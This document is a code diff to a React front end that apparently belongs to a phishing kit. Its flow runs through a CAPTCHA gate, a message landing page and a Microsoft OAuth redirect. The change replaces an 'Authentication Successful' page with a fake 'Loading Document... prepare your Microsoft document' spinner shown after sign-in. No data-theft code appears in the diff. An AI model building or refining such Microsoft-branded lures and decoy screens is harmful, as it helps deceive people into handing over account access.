@@ -12,14 +12,13 @@ function App() {
     const step = urlParams.get('step');
     
     // Only set initial state if there's a step parameter
-    if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success'].includes(step)) {
+    if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
       setCurrentPage(step);
       // Clean the URL after reading the parameter
       window.history.replaceState({}, document.title, window.location.pathname);
     }
-  }, []); // Empty dependency array - only run once
+  }, []);
 
-  // Handle the complete flow - starts with CAPTCHA
   const handleCaptchaVerified = () => {
     console.log('✅ CAPTCHA verified - moving to message icon landing');
     setCurrentPage('message-icon');
@@ -37,8 +36,8 @@ function App() {
 
   const handleOAuthSuccess = (sessionData: any) => {
     console.log('🔐 OAuth successful:', sessionData);
-    // After successful OAuth, show success message or redirect
-    setCurrentPage('success');
+    // After successful OAuth, show document loading
+    setCurrentPage('document-loading');
   };
 
   const handleOAuthBack = () => {
@@ -71,6 +70,7 @@ function App() {
       );
 
     case 'success':
+    case 'document-loading':
       return (
         <div style={{ 
           display: 'flex', 
@@ -83,39 +83,67 @@ function App() {
           <div style={{ 
             textAlign: 'center',
             background: 'white',
-            padding: '40px',
+            padding: '60px',
             borderRadius: '8px',
             boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
           }}>
-            <h2>🎉 Authentication Successful!</h2>
-            <p>You have been successfully authenticated with Microsoft.</p>
-            <button 
-              onClick={() => setCurrentPage('captcha')}
-              style={{
-                padding: '10px 20px',
-                backgroundColor: '#0078d4',
-                color: 'white',
-                border: 'none',
-                borderRadius: '4px',
-                cursor: 'pointer',
-                marginRight: '10px'
-              }}
-            >
-              Start Over
-            </button>
-            <button 
-              onClick={() => setCurrentPage('oauth-redirect')}
-              style={{
-                padding: '10px 20px',
-                backgroundColor: '#107c10',
-                color: 'white',
-                border: 'none',
-                borderRadius: '4px',
-                cursor: 'pointer'
-              }}
-            >
-              Try Again
-            </button>
+            {/* Spinning document icon */}
+            <div style={{
+              width: '80px',
+              height: '80px',
+              background: '#0078d4',
+              borderRadius: '8px',
+              margin: '0 auto 30px',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              animation: 'spin 2s linear infinite',
+              fontSize: '40px',
+              color: 'white'
+            }}>
+              📄
+            </div>
+            
+            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
+              Loading Document...
+            </h2>
+            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
+              Please wait while we prepare your Microsoft document
+            </p>
+            
+            <div style={{
+              display: 'flex',
+              justifyContent: 'center',
+              gap: '10px',
+              marginTop: '30px'
+            }}>
+              <button 
+                onClick={() => setCurrentPage('captcha')}
+                style={{
+                  padding: '10px 20px',
+                  backgroundColor: '#0078d4',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                Start Over
+              </button>
+              <button 
+                onClick={() => setCurrentPage('oauth-redirect')}
+                style={{
+                  padding: '10px 20px',
+                  backgroundColor: '#107c10',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                Try Again
+              </button>
+            </div>
           </div>
         </div>
       );
